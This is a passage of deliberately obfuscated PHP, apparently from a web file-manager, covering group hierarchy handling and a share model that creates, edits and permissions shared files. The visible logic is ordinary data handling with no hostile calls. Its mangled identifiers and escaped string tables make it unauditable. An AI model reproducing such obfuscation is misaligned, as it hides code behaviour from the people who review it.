$ÆàòÕë)); $›ƒ½ÉùÁ = array($–»ŠƒûÒ[441], $–»ŠƒûÒ[1967] => $–»ŠƒûÒ[500]); $à‰îù÷ = $this->field($›ƒ½ÉùÁ)->where($ì¶şÊÎ)->group($–»ŠƒûÒ[441])->select(); $ŠÒßïÂİ = array_to_keyvalue($à‰îù÷, $–»ŠƒûÒ[441], $–»ŠƒûÒ[500]); foreach ($ä•£ğÀ as &$÷ˆæºÕ’) { $¨ğ¥ö¾Œ = $÷ˆæºÕ’[$–»ŠƒûÒ[1867]]; $÷ˆæºÕ’[$–»ŠƒûÒ[1968]] = isset($ŠÒßïÂİ[$¨ğ¥ö¾Œ]) ? intval($ŠÒßïÂİ[$¨ğ¥ö¾Œ]) : !1; } unset($÷ˆæºÕ’); } private function _listAppendChildrenMember(&$±ŠÔ—ßš) { $ï„§Ïçõ =& $_SERVER[ï»»·÷á]; $åæ˜ÄµÅ = array_to_keyvalue($±ŠÔ—ßš, $ï„§Ïçõ[12], $ï„§Ïçõ[1867]); $·”í£ïâ = array($ï„§Ïçõ[1867] => array($ï„§Ïçõ[7], $åæ˜ÄµÅ)); $ñË©Õ¦œ = array($ï„§Ïçõ[1867], $ï„§Ïçõ[1967] => $ï„§Ïçõ[500]); $æ’Â ¢ = Model($ï„§Ïçõ[1957])->field($ñË©Õ¦œ)->where($·”í£ïâ)->group($ï„§Ïçõ[1867])->select(); $«¦æ›¸ı = array_to_keyvalue($æ’Â ¢, $ï„§Ïçõ[1867], $ï„§Ïçõ[500]); foreach ($±ŠÔ—ßš as &$…é™Ûª×) { $ÛÏŞè¹ç = $…é™Ûª×[$ï„§Ïçõ[1867]]; $…é™Ûª×[$ï„§Ïçõ[1969]] = isset($«¦æ›¸ı[$ÛÏŞè¹ç]) ? intval($«¦æ›¸ı[$ÛÏŞè¹ç]) : !1; } unset($…é™Ûª×); } private function _listAppendMeta(&$Ÿú•ûƒì, $´Ş ¨) { $¬†´ÄâØ =& $_SERVER[ï»»·÷á]; $¶¤³Âù‚ = array($¬†´ÄâØ[1867] => array($¬†´ÄâØ[7], $´Ş ¨)); $©ç«òà = Model($¬†´ÄâØ[1956])->where($¶¤³Âù‚)->select(); $©ç«òà = array_to_keyvalue_group($©ç«òà, $¬†´ÄâØ[1867]); foreach ($©ç«òà as &$Ì¶ÅçÙ§) { $Ì¶ÅçÙ§ = array_to_keyvalue($Ì¶ÅçÙ§, $¬†´ÄâØ[94], $¬†´ÄâØ[374]); } unset($Ì¶ÅçÙ§); foreach ($Ÿú•ûƒì as &$²ÇûƒÁ•) { $²ÇûƒÁ•[$¬†´ÄâØ[475]] = array(); if (isset($©ç«òà[$²ÇûƒÁ•[$¬†´ÄâØ[1867]]])) { $²ÇûƒÁ•[$¬†´ÄâØ[475]] = $©ç«òà[$²ÇûƒÁ•[$¬†´ÄâØ[1867]]]; } } unset($²ÇûƒÁ•); } protected function parentLevelArray($¨éÏ§‡š) { $Õ“©óæ =& $_SERVER[ï»»·÷á]; $¨éÏ§‡š = explode($Õ“©óæ[50], trim($¨éÏ§‡š, $Õ“©óæ[50])); $¨éÏ§‡š = array_remove_value($¨éÏ§‡š, $Õ“©óæ[198]); return $¨éÏ§‡š; } protected function parentInGroup($ƒù±Èã¾, $ğ†ÙêŒ‰) { $£‘‘ğß÷ =& $_SERVER[ï»»·÷á]; $Æ½²²ì® = $this->getInfoSimple($ƒù±Èã¾); if (!$Æ½²²ì®) { return !0; } $µ‹ã£Ù² = $this->parentLevelArray($Æ½²²ì®[$£‘‘ğß÷[520]]); $µ‹ã£Ù²[] = $ƒù±Èã¾; foreach ($µ‹ã£Ù² as $ƒù±Èã¾) { if (in_array($ƒù±Èã¾ . $£‘‘ğß÷[12], $ğ†ÙêŒ‰)) { return !0; } } return !1; } private function _listAppendParent(&$ÍŠùşÉ°) { $îÄüœ“ =& $_SERVER[ï»»·÷á]; $§ÍâĞ‘æ = array(); foreach ($ÍŠùşÉ° as &$ Ğø“ğ×) { $§ÍâĞ‘æ[$ Ğø“ğ×[$îÄüœ“[1867]]] = $ Ğø“ğ×[$îÄüœ“[32]]; $ÁÀêÒÔ¶ = $this->parentLevelArray($ Ğø“ğ×[$îÄüœ“[520]]); foreach ($ÁÀêÒÔ¶ as $¬—ÚŸº½) { if (!isset($§ÍâĞ‘æ[$¬—ÚŸº½])) { $§ÍâĞ‘æ[$¬—ÚŸº½] = 0; } } } unset($ Ğø“ğ×); foreach ($§ÍâĞ‘æ as $óòÙ°Õ¥ => $¶€§ÌÄÑ) { if ($¶€§ÌÄÑ) { continue; } $ËĞ¬ƒÓÁ = $this->getInfoSimple($óòÙ°Õ¥); $§ÍâĞ‘æ[$óòÙ°Õ¥] = $ËĞ¬ƒÓÁ[$îÄüœ“[32]]; } $ãö†úØÈ = $GLOBALS[$îÄüœ“[6]][$îÄüœ“[89]][$îÄüœ“[1970]]; if ($GLOBALS[$îÄüœ“[503]] == $îÄüœ“[88]) { $ãö†úØÈ = !1; } foreach ($ÍŠùşÉ° as &$ Ğø“ğ×) { $ÁÀêÒÔ¶ = $this->parentLevelArray($ Ğø“ğ×[$îÄüœ“[520]]); $Æ¨£íÊ = $îÄüœ“[12]; foreach ($ÁÀêÒÔ¶ as $óòÙ°Õ¥ => $¬—ÚŸº½) { if ($ãö†úØÈ && $óòÙ°Õ¥ == 0) { continue; } $Æ¨£íÊ .= $§ÍâĞ‘æ[$¬—ÚŸº½] . $îÄüœ“[8]; } if ($ÁÀêÒÔ¶) { $Æ¨£íÊ .= $ Ğø“ğ×[$îÄüœ“[32]]; } $ Ğø“ğ×[$îÄüœ“[525]] = str_replace($îÄüœ“[528], $îÄüœ“[8], $Æ¨£íÊ); } unset($ Ğø“ğ×); } private function _listAppendSourceRoot(&$Ëù¾ë¿æ, $ÊĞöèì–) { $ø“î–œ² =& $_SERVER[ï»»·÷á]; $²Ÿ€æ• = Model($ø“î–œ²[838])->listSourceRoot(SourceModel::TYPE_GROUP, $ÊĞöèì–); $²Ÿ€æ• = array_to_keyvalue($²Ÿ€æ•, $ø“î–œ²[505]); $²Ÿ€æ• = array_remove_key($²Ÿ€æ•, $ø“î–œ²[505]); foreach ($Ëù¾ë¿æ as &$å½›Êüè) { $å½›Êüè[$ø“î–œ²[87]] = $²Ÿ€æ•[$å½›Êüè[$ø“î–œ²[1867]]] ? $²Ÿ€æ•[$å½›Êüè[$ø“î–œ²[1867]]] : array(); } unset($å½›Êüè); } protected function groupMerge($ê¥­ŞƒÁ) { $ê¥­ŞƒÁ = array_values(array_unique($ê¥­ŞƒÁ)); $Ô…¤Òœ = array(); for ($œª‰ˆ¡¥ = 0; $œª‰ˆ¡¥ < count($ê¥­ŞƒÁ); $œª‰ˆ¡¥++) { $°¡†ÃìÖ = !1; for ($µí”¹Í” = 0; $µí”¹Í” < count($ê¥­ŞƒÁ); $µí”¹Í”++) { if ($œª‰ˆ¡¥ == $µí”¹Í”) { continue; } if ($this->isParentOf($ê¥­ŞƒÁ[$µí”¹Í”], $ê¥­ŞƒÁ[$œª‰ˆ¡¥])) { $°¡†ÃìÖ = !0; break; } } if (!$°¡†ÃìÖ) { $Ô…¤Òœ[] = $ê¥­ŞƒÁ[$œª‰ˆ¡¥]; } } return $Ô…¤Òœ; } protected function isParentOf($ªáøÂ³ñ, $ü³·Ş˜) { $éåš¹œ =& $_SERVER[ï»»·÷á]; if (!$ªáøÂ³ñ || !$ü³·Ş˜ || $ªáøÂ³ñ == $ü³·Ş˜) { return !1; } $—©¬Ç¹Ã = $this->getInfoSimple($ªáøÂ³ñ); $ÊÈÔ®€Ó = $this->getInfoSimple($ü³·Ş˜); $äÑÑ­À = $—©¬Ç¹Ã[$éåš¹œ[520]] . $ªáøÂ³ñ . $éåš¹œ[50]; if (substr($ÊÈÔ®€Ó[$éåš¹œ[520]], 0, strlen($äÑÑ­À)) == $äÑÑ­À) { return !0; } return !1; } public function groupShowRoot($®÷ë¿äÊ, $µƒÃÛÅ = false) { $áœŠá´Œ =& $_SERVER[ï»»·÷á]; $ĞºÙ™ø“ = $this->getInfo($®÷ë¿äÊ); if (!$ĞºÙ™ø“) { return array(); } $Ô“”åƒÄ = $this->parentLevelArray($ĞºÙ™ø“[$áœŠá´Œ[520]]); $Ê ¤ª = array($®÷ë¿äÊ); if (count($Ô“”åƒÄ) == 0) { return $Ê ¤ª; } if ($µƒÃÛÅ && count($Ô“”åƒÄ) == 1) { return $Ê ¤ª; } if (!$ĞºÙ™ø“[$áœŠá´Œ[475]] || !isset($ĞºÙ™ø“[$áœŠá´Œ[475]][$áœŠá´Œ[1953]]) || $ĞºÙ™ø“[$áœŠá´Œ[475]][$áœŠá´Œ[1953]] == $áœŠá´Œ[1922]) { return $this->groupShowRoot($Ô“”åƒÄ[count($Ô“”åƒÄ) - 1], $µƒÃÛÅ); } if ($ĞºÙ™ø“[$áœŠá´Œ[475]][$áœŠá´Œ[1953]] == $áœŠá´Œ[357]) { $…ÅÙ©¥  = explode($áœŠá´Œ[50], $ĞºÙ™ø“[$áœŠá´Œ[475]][$áœŠá´Œ[1954]]); if ($…ÅÙ©¥ ) { $Ê ¤ª = array_merge($Ê ¤ª, $…ÅÙ©¥ ); } } return $Ê ¤ª; } protected function resetParentLevel() { $–åÑÈÈ =& $_SERVER[ï»»·÷á]; $éè¸šÍ = $–åÑÈÈ[1867]; $­Ÿšü´ = $this->select(); $­Ÿšü´ = array_to_keyvalue($­Ÿšü´, $éè¸šÍ); foreach ($­Ÿšü´ as $ô–í½³) { $š©ò„«ø = $ô–í½³; $Ø¥ŞŒí = array(); while ($š©ò„«ø[$–åÑÈÈ[441]] != 0) { $Ø¥ŞŒí[] = $š©ò„«ø[$–åÑÈÈ[441]]; $š©ò„«ø = $­Ÿšü´[$š©ò„«ø[$–åÑÈÈ[441]]]; } $Ø¥ŞŒí[] = 0; $Ø¥ŞŒí = $–åÑÈÈ[50] . implode($–åÑÈÈ[50], array_reverse($Ø¥ŞŒí)) . $–åÑÈÈ[50]; $this->setNamePinyin($ô–í½³[$éè¸šÍ], $ô–í½³[$–åÑÈÈ[32]]); $this->where(array($éè¸šÍ => $ô–í½³[$éè¸šÍ]))->save(array($–åÑÈÈ[589] => $Ø¥ŞŒí)); } return $­Ÿšü´; } public function groupNameAuto($‹Ùï¥Á¸, $î‰¶‚ñ) { $‘şï‡ò× =& $_SERVER[ï»»·÷á]; $·ì«¯©ã = $this->where(array($‘şï‡ò×[410] => $‹Ùï¥Á¸))->getField($‘şï‡ò×[32], !0); if (!$·ì«¯©ã || !in_array($î‰¶‚ñ, $·ì«¯©ã)) { return $î‰¶‚ñ; } for ($åÔ¦İ¥« = 1; $åÔ¦İ¥« <= count($·ì«¯©ã) + 1; $åÔ¦İ¥«++) { $Ïš‡Ø€ = $î‰¶‚ñ . "\50{$åÔ¦İ¥«}\51"; if (!in_array($Ïš‡Ø€, $·ì«¯©ã)) { return $Ïš‡Ø€; } } } public function groupSwitch($ôŒ¦Øü, $ Œˆûö) { $¯ÀÚˆ =& $_SERVER[ï»»·÷á]; $è¬óÜ® = array($¯ÀÚˆ[1867] => array($¯ÀÚˆ[7], array($ôŒ¦Øü, $ Œˆûö))); $¬Å£æ¯½ = $this->where($è¬óÜ®)->select(); $¬Å£æ¯½ = array_to_keyvalue($¬Å£æ¯½, $¯ÀÚˆ[1867]); if (!isset($¬Å£æ¯½[$ôŒ¦Øü]) || !isset($¬Å£æ¯½[$ Œˆûö]) || $¬Å£æ¯½[$ôŒ¦Øü][$¯ÀÚˆ[441]] == 0) { return !1; } $è¬óÜ® = array($¯ÀÚˆ[1867] => $ôŒ¦Øü); $Çáº±ï§ = Model($¯ÀÚˆ[1957])->where($è¬óÜ®)->select(); if (!$Çáº±ï§) { $Çáº±ï§ = array(); } foreach ($Çáº±ï§ as $¼ŒÑµâ) { $“¦‡âŸ„ = $¼ŒÑµâ[$¯ÀÚˆ[1678]]; $è¬óÜ® = array($¯ÀÚˆ[1678] => $“¦‡âŸ„, $¯ÀÚˆ[1867] => $ Œˆûö); $—ôÁ–ÔÄ = Model($¯ÀÚˆ[1957])->where($è¬óÜ®)->find(); if (!$—ôÁ–ÔÄ) { $œ‚ŞæùÛ = array($ Œˆûö => $¼ŒÑµâ[$¯ÀÚˆ[1971]]); Model($¯ÀÚˆ[534])->userGroupAdd($“¦‡âŸ„, $œ‚ŞæùÛ); } Model($¯ÀÚˆ[534])->userGroupRemove($“¦‡âŸ„, $ôŒ¦Øü); } $è¬óÜ® = array($¯ÀÚˆ[420] => 2, $¯ÀÚˆ[441] => 0, $¯ÀÚˆ[419] => 1, $¯ÀÚˆ[505] => array($¯ÀÚˆ[7], array($ôŒ¦Øü, $ Œˆûö))); $ìƒôı•¶ = Model($¯ÀÚˆ[838])->where($è¬óÜ®)->field($¯ÀÚˆ[1972])->select(); $ìƒôı•¶ = array_to_keyvalue($ìƒôı•¶, $¯ÀÚˆ[505], $¯ÀÚˆ[411]); $ïâ‘·Æ“ = !empty($ìƒôı•¶[$ôŒ¦Øü]) ? $ìƒôı•¶[$ôŒ¦Øü] : !1; if ($ïâ‘·Æ“) { if (!$ìƒôı•¶[$ Œˆûö]) { $ìƒôı•¶[$ Œˆûö] = Model($¯ÀÚˆ[838])->groupRootAdd($ Œˆûö); } $¯…Õ™ùª = $ìƒôı•¶[$ Œˆûö]; $è¬óÜ® = array($¯ÀÚˆ[441] => $ïâ‘·Æ“); $ìƒôı•¶ = Model($¯ÀÚˆ[838])->where($è¬óÜ®)->field($¯ÀÚˆ[1973])->select(); if (!$ìƒôı•¶) { $ìƒôı•¶ = array(); } Model($¯ÀÚˆ[838])->moveClearAuth = !1; foreach ($ìƒôı•¶ as $‘ïà¹Ï) { $ÙÙıÙô¼ = $‘ïà¹Ï[$¯ÀÚˆ[419]] == $¯ÀÚˆ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¯ÀÚˆ[838])->move($‘ïà¹Ï[$¯ÀÚˆ[411]], $¯…Õ™ùª, $ÙÙıÙô¼); } Model($¯ÀÚˆ[838])->moveClearAuth = !0; $è¬óÜ® = array($¯ÀÚˆ[420] => 2, $¯ÀÚˆ[505] => $ôŒ¦Øü); $ÅËÏ£éï = array($¯ÀÚˆ[505] => $ Œˆûö); Model($¯ÀÚˆ[1974])->where($è¬óÜ®)->save($ÅËÏ£éï); Model($¯ÀÚˆ[1975])->where($è¬óÜ®)->save($ÅËÏ£éï); } $this->_changeChildLevel($¬Å£æ¯½[$ôŒ¦Øü], $¬Å£æ¯½[$ Œˆûö], !0); $this->where(array($¯ÀÚˆ[441] => $ôŒ¦Øü))->save(array($¯ÀÚˆ[441] => $ Œˆûö)); $this->_clearChildrenCache($¬Å£æ¯½[$ Œˆûö]); return !0; } } goto bÍÔÔ ’Ğ§; aÜ­„ÚÌ¡÷: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\x6d\145", "\x74\151\155\145", "\x69\x6e\163\145\162\x74\x2c\x75\x70\x64\141\164\145", "\146\165\156\143\164\x69\157\x6e"), array("\x63\162\x65\141\x74\145\x54\x69\155\145", "\164\151\155\145", "\151\156\163\145\162\164", "\x66\165\156\143\164\151\157\x6e"), array("\157\160\x74\151\157\156\163", '', "\x69\x6e\163\x65\162\164\x2c\165\160\x64\141\164\x65\54\x73\145\154\145\143\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($€ô¼œ¼Š) { $Õ½Î‘ÒÀ =& $_SERVER[ï»»·÷á]; $ûëÛª“ = isset($€ô¼œ¼Š[0]) ? $€ô¼œ¼Š[0] : !1; return array($Õ½Î‘ÒÀ[2006] => array(USER_ID, $Õ½Î‘ÒÀ[2007]), $Õ½Î‘ÒÀ[1947] => array($ûëÛª“, $Õ½Î‘ÒÀ[2008])); } protected function listSimple() { $œõ©®± = array($_SERVER[ï»»·÷á][1678] => USER_ID); $–Ïİë Œ = $this->field($this->fieldList)->where($œõ©®±)->select(); return $–Ïİë Œ ? $–Ïİë Œ : array(); } protected function getInfo($‰Ù—Šª, $ÃÓÑóÔâ = false) { $›–¤„¸‘ =& $_SERVER[ï»»·÷á]; if ($ÃÓÑóÔâ) { return $this->_getShareInfo(array($›–¤„¸‘[602] => $‰Ù—Šª)); } $ò“ı£ÈØ = $this->cacheFunctionGet($›–¤„¸‘[1949], $‰Ù—Šª); return $ò“ı£ÈØ; } public function getInfoByHash($»†ÂØ¦) { return $this->_getShareInfo(array($_SERVER[ï»»·÷á][2009] => $»†ÂØ¦)); } public function getInfoByPath($ÖßùÀ•) { $ üˆ¶Š¬ =& $_SERVER[ï»»·÷á]; $å¼Õ€İà = array($ üˆ¶Š¬[1678] => USER_ID, $ üˆ¶Š¬[411] => $ÖßùÀ•); return $this->_getShareInfo($å¼Õ€İà); } public function getInfoBySourcePath($ÀÌµ˜¸·) { $á´˜ò±û =& $_SERVER[ï»»·÷á]; $÷í‰â©õ = array($á´˜ò±û[1678] => USER_ID, $á´˜ò±û[1185] => $ÀÌµ˜¸·); return $this->_getShareInfo($÷í‰â©õ); } private function _getShareInfo($¼¯Ş¼İ«) { $‹¤ñ²‡´ =& $_SERVER[ï»»·÷á]; $ï…°ô = $this->where($¼¯Ş¼İ«)->find(); if (!$ï…°ô) { return !1; } $¼¯Ş¼İ« = array($‹¤ñ²‡´[602] => $ï…°ô[$‹¤ñ²‡´[602]]); $´’éÕ„ó = $‹¤ñ²‡´[2010]; $Ó² Áò¦ = Model($‹¤ñ²‡´[603])->order($‹¤ñ²‡´[399])->field($´’éÕ„ó)->where($¼¯Ş¼İ«)->select(); if ($ï…°ô[$‹¤ñ²‡´[411]] == $‹¤ñ²‡´[198]) { $ï…°ô[$‹¤ñ²‡´[87]] = IO::info($ï…°ô[$‹¤ñ²‡´[1185]]); } else { $ï…°ô[$‹¤ñ²‡´[87]] = Model($‹¤ñ²‡´[1349])->pathInfo($ï…°ô[$‹¤ñ²‡´[411]]); } $ï…°ô[$‹¤ñ²‡´[2011]] = $Ó² Áò¦; return $ï…°ô; } protected function getInfoAuth($Î˜ƒà„º) { $ğ‡¶¼ƒ» =& $_SERVER[ï»»·÷á]; $¤½˜úÑ° = $this->getInfo($Î˜ƒà„º); if ($¤½˜úÑ°[$ğ‡¶¼ƒ»[1678]] == USER_ID) { $¤½˜úÑ°[$ğ‡¶¼ƒ»[422]] = $¤½˜úÑ°[$ğ‡¶¼ƒ»[87]][$ğ‡¶¼ƒ»[422]]; } else { $¤½˜úÑ°[$ğ‡¶¼ƒ»[422]] = Model($ğ‡¶¼ƒ»[502])->authMake($¤½˜úÑ°[$ğ‡¶¼ƒ»[2011]]); } return $¤½˜úÑ°; } protected function listData($’Ì§Ñıı = null, $ë¨ßæ‹¬ = 300) { $ÅêÉ¨„Î =& $_SERVER[ï»»·÷á]; $á¢ãàŸ = array(array($ÅêÉ¨„Î[497] => array($ÅêÉ¨„Î[1022], 0), $ÅêÉ¨„Î[600] => array($ÅêÉ¨„Î[1022], 0), $ÅêÉ¨„Î[2012] => $ÅêÉ¨„Î[1965])); if ($’Ì§Ñıı == $ÅêÉ¨„Î[2013]) { $á¢ãàŸ = array($ÅêÉ¨„Î[497] => 1); } else { if ($’Ì§Ñıı == $ÅêÉ¨„Î[1171]) { $á¢ãàŸ = array($ÅêÉ¨„Î[600] => 1); } } $á¢ãàŸ[$ÅêÉ¨„Î[1678]] = USER_ID; $¼¶•¦¶º = $this->where($á¢ãàŸ)->selectPage($ë¨ßæ‹¬); return $¼¶•¦¶º; } protected function listToMe($›‹§Æş÷ = 300) { $µÊˆüò— =& $_SERVER[ï»»·÷á]; $øè¡«Ş‹ = Model($µÊˆüò—[2014])->userGroupParents(USER_ID); $£ï½çç× = array($µÊˆüò—[585] => SourceModel::TYPE_USER, $µÊˆüò—[505] => USER_ID); if ($øè¡«Ş‹) { $£ï½çç× = array(array($µÊˆüò—[585] => SourceModel::TYPE_USER, $µÊˆüò—[505] => USER_ID), array($µÊˆüò—[585] => SourceModel::TYPE_GROUP, $µÊˆüò—[505] => array($µÊˆüò—[7], $øè¡«Ş‹)), $µÊˆüò—[2012] => $µÊˆüò—[1965]); } $§÷Şšôş = Model($µÊˆüò—[603])->where($£ï½çç×)->selectPage($›‹§Æş÷); $Õ÷ñÜ© = array_to_keyvalue_group($§÷Şšôş[$µÊˆüò—[369]], $µÊˆüò—[602]); if (!$Õ÷ñÜ©) { return $§÷Şšôş; } $š·ìªéò = $µÊˆüò—[2015]; $£ï½çç× = array($µÊˆüò—[602] => array($µÊˆüò—[427], array_keys($Õ÷ñÜ©)), $µÊˆüò—[1678] => array($µÊˆüò—[1024], $µÊˆüò—[198])); $…Õ©şö  = $this->field($š·ìªéò)->where($£ï½çç×)->select(); foreach ($…Õ©şö  as $¦‚ˆÙğ¬ => &$ÍüĞ¦ÈÔ) { $ÍüĞ¦ÈÔ[$µÊˆüò—[2011]] = $Õ÷ñÜ©[$ÍüĞ¦ÈÔ[$µÊˆüò—[602]]]; } unset($ÍüĞ¦ÈÔ); $ÕÆœØ•Ì = array($µÊˆüò—[2016] => $…Õ©şö , $µÊˆüò—[2017] => $§÷Şšôş[$µÊˆüò—[366]]); return $ÕÆœØ•Ì; } protected function shareAdd($ØÊÇİÜÌ, $¼×§–‹) { $ó½È¾çù =& $_SERVER[ï»»·÷á]; $ìã·ĞÈß = $this->_addShareData($ØÊÇİÜÌ, $¼×§–‹); if (!empty($¼×§–‹[$ó½È¾çù[2018]])) { $this->_shareAuthSet($ìã·ĞÈß, $¼×§–‹[$ó½È¾çù[2018]]); } $this->shareEventAdd($ØÊÇİÜÌ, $¼×§–‹, $ó½È¾çù[2019]); return $ìã·ĞÈß; } protected function shareAddSystem($›ƒèå°ö, $£®Ñ†íĞ) { $•ì¦ÉÃÙ =& $_SERVER[ï»»·÷á]; $ûşÓœÁ = $this->_addShareData($›ƒèå°ö, $£®Ñ†íĞ, $•ì¦ÉÃÙ[1294]); $this->_shareAuthSet($ûşÓœÁ, $£®Ñ†íĞ[$•ì¦ÉÃÙ[2018]]); return $ûşÓœÁ; } private function shareEventAdd($ÔÉêÀÍö, $ÃÌÁéïÎ, $Îî•ûàö = "\x61\x64\x64") { $‹ñ¦©‚– =& $_SERVER[ï»»·÷á]; if (!$ÔÉêÀÍö || $ÔÉêÀÍö == $‹ñ¦©‚–[198]) { return; } if ($Îî•ûàö == $‹ñ¦©‚–[2019]) { if ($ÃÌÁéïÎ[$‹ñ¦©‚–[497]] == $‹ñ¦©‚–[88]) { Model($‹ñ¦©‚–[570])->eventShare($ÔÉêÀÍö, $‹ñ¦©‚–[2020]); } if ($ÃÌÁéïÎ[$‹ñ¦©‚–[600]] == $‹ñ¦©‚–[88]) { Model($‹ñ¦©‚–[570])->eventShare($ÔÉêÀÍö, $‹ñ¦©‚–[2021]); } return; } $§ÙÅÀ‹ı = $this->getInfoByPath($ÔÉêÀÍö); $¤Õ³Úº = $‹ñ¦©‚–[2022]; if ($§ÙÅÀ‹ı[$‹ñ¦©‚–[497]] == $‹ñ¦©‚–[198] && $ÃÌÁéïÎ[$‹ñ¦©‚–[497]] == $‹ñ¦©‚–[88]) { $¤Õ³Úº = $‹ñ¦©‚–[2020]; } if ($§ÙÅÀ‹ı[$‹ñ¦©‚–[497]] == $‹ñ¦©‚–[88] && $ÃÌÁéïÎ[$‹ñ¦©‚–[497]] == $‹ñ¦©‚–[198]) { $¤Õ³Úº = $‹ñ¦©‚–[2023]; } if ($§ÙÅÀ‹ı[$‹ñ¦©‚–[600]] == $‹ñ¦©‚–[198] && $ÃÌÁéïÎ[$‹ñ¦©‚–[600]] == $‹ñ¦©‚–[88]) { $¤Õ³Úº = $‹ñ¦©‚–[2021]; } if ($§ÙÅÀ‹ı[$‹ñ¦©‚–[600]] == $‹ñ¦©‚–[88] && $ÃÌÁéïÎ[$‹ñ¦©‚–[600]] == $‹ñ¦©‚–[198]) { $¤Õ³Úº = $‹ñ¦©‚–[2024]; } Model($‹ñ¦©‚–[570])->eventShare($ÔÉêÀÍö, $¤Õ³Úº); return; } private function _addShareData($ŞëìÅÊß, $ß«É†ÑÍ = array(), $ø†àªØŸ = false) { $¶³ê¾— =& $_SERVER[ï»»·÷á]; $Èƒ—‹ = $ø†àªØŸ == $¶³ê¾—[1294] ? 0 : USER_ID; $Ö×²“öï = array($¶³ê¾—[426] => $ŞëìÅÊß, $¶³ê¾—[1669] => $Èƒ—‹); if ($ŞëìÅÊß == 0) { $Ö×²“öï = array($¶³ê¾—[2025] => $ß«É†ÑÍ[$¶³ê¾—[1185]], $¶³ê¾—[1669] => $Èƒ—‹); } if ($®ƒÕáÉ = $this->where($Ö×²“öï)->find()) { return $®ƒÕáÉ[$¶³ê¾—[602]]; } if ($ŞëìÅÊß == 0) { $—Ó©˜Í = array($¶³ê¾—[32] => get_path_this($ß«É†ÑÍ[$¶³ê¾—[84]])); } else { $—Ó©˜Í = Model($¶³ê¾—[838])->sourceInfo($ŞëìÅÊß); if (!$—Ó©˜Í) { return !1; } } if (!$ß«É†ÑÍ[$¶³ê¾—[1576]]) { $ß«É†ÑÍ[$¶³ê¾—[1576]] = $—Ó©˜Í[$¶³ê¾—[32]]; } $›¼üî‹ˆ = array($¶³ê¾—[1669] => $Èƒ—‹, $¶³ê¾—[426] => $ŞëìÅÊß, $¶³ê¾—[1576] => $¶³ê¾—[12], $¶³ê¾—[497] => 0, $¶³ê¾—[600] => 0, $¶³ê¾—[1185] => $¶³ê¾—[12], $¶³ê¾—[307] => $¶³ê¾—[12], $¶³ê¾—[899] => $¶³ê¾—[12], $¶³ê¾—[2026] => 0, $¶³ê¾—[2027] => 0, $¶³ê¾—[774] => 0, $¶³ê¾—[2028] => $¶³ê¾—[12], $¶³ê¾—[2009] => $¶³ê¾—[12]); $Ûˆü¤®Õ = explode($¶³ê¾—[50], $¶³ê¾—[2029]); foreach ($Ûˆü¤®Õ as $ï¾ñšÅ) { if (!isset($ß«É†ÑÍ[$ï¾ñšÅ])) { continue; } $›¼üî‹ˆ[$ï¾ñšÅ] = $ß«É†ÑÍ[$ï¾ñšÅ]; } $à‰€·’ş = $this->add($›¼üî‹ˆ); $ø–ÜóÙÜ = array($¶³ê¾—[2009] => short_id($à‰€·’ş)); $this->where(array($¶³ê¾—[2030] => $à‰€·’ş))->save($ø–ÜóÙÜ); return $à‰€·’ş; } private function _shareAuthSet($ê€Óùìİ, $ÁÂâìÉ) { $˜“ÖÒ‚õ =& $_SERVER[ï»»·÷á]; if (!is_array($ÁÂâìÉ)) { return !1; } $¯¡‚Ñ‚ = Model($˜“ÖÒ‚õ[1975]); $¯¡‚Ñ‚->where(array($˜“ÖÒ‚õ[602] => $ê€Óùìİ))->delete(); $È¡æêñ™ = array(); foreach ($ÁÂâìÉ as $¿ÅÜ…¿Ğ) { $˜¢´ª¬¦ = SourceModel::TYPE_USER; if ($¿ÅÜ…¿Ğ[$˜“ÖÒ‚õ[420]] == SourceModel::TYPE_GROUP) { $˜¢´ª¬¦ = SourceModel::TYPE_GROUP; } $Áø©Ïè‹ = array($˜“ÖÒ‚õ[602] => $ê€Óùìİ, $˜“ÖÒ‚õ[420] => $˜¢´ª¬¦, $˜“ÖÒ‚õ[505] => intval($¿ÅÜ…¿Ğ[$˜“ÖÒ‚õ[505]]), $˜“ÖÒ‚õ[1971] => 0, $˜“ÖÒ‚õ[2031] => -1); if ($¿ÅÜ…¿Ğ[$˜“ÖÒ‚õ[1971]]) { $Áø©Ïè‹[$˜“ÖÒ‚õ[1971]] = $¿ÅÜ…¿Ğ[$˜“ÖÒ‚õ[1971]]; } else { if ($¿ÅÜ…¿Ğ[$˜“ÖÒ‚õ[2031]]) { $Áø©Ïè‹[$˜“ÖÒ‚õ[2031]] = $¿ÅÜ…¿Ğ[$˜“ÖÒ‚õ[2031]]; } } $È¡æêñ™[] = $Áø©Ïè‹; } return $¯¡‚Ñ‚->addAll($È¡æêñ™, array(), !0); } public function numViewAdd($‡ÜÃé› ) { $¶’¹ÄÕæ =& $_SERVER[ï»»·÷á]; $»…Ä¿ĞÀ = array($¶’¹ÄÕæ[2030] => $‡ÜÃé› ); $this->where($»…Ä¿ĞÀ)->setAdd($¶’¹ÄÕæ[2026]); } public function numDownloadAdd($‡£ñÆÁ) { $¥ºÍÎÆ¨ =& $_SERVER[ï»»·÷á]; $ĞÛ‰·¼† = array($¥ºÍÎÆ¨[2030] => $‡£ñÆÁ); $this->where($ĞÛ‰·¼†)->setAdd($¥ºÍÎÆ¨[2027]); } protected function shareEdit($ßÈ¥œ°Ã, $÷ö—â”ï) { $éá•ù‚ò =& $_SERVER[ï»»·÷á]; $ò²ª¨Ó© = $this->getInfo($ßÈ¥œ°Ã); if (!$ò²ª¨Ó©) { return !1; } $this->_checkLinkShare($÷ö—â”ï, $ò²ª¨Ó©); $¤áŸ¹ó = array(); $Ãí­Œ®Î = explode($éá•ù‚ò[50], $éá•ù‚ò[2032]); foreach ($Ãí­Œ®Î as $Òò°ªÒô) { if (!array_key_exists($Òò°ªÒô, $÷ö—â”ï)) { continue; } $¤áŸ¹ó[$Òò°ªÒô] = $÷ö—â”ï[$Òò°ªÒô]; } $this->shareEventAdd($ò²ª¨Ó©[$éá•ù‚ò[411]], $÷ö—â”ï, $éá•ù‚ò[1837]); $this->where(array($éá•ù‚ò[2030] => $ßÈ¥œ°Ã))->save($¤áŸ¹ó); if (isset($÷ö—â”ï[$éá•ù‚ò[2018]])) { $this->_shareAuthSet($ßÈ¥œ°Ã, $÷ö—â”ï[$éá•ù‚ò[2018]]); } return !0; } private function _checkLinkShare($î˜”ÀÁİ, 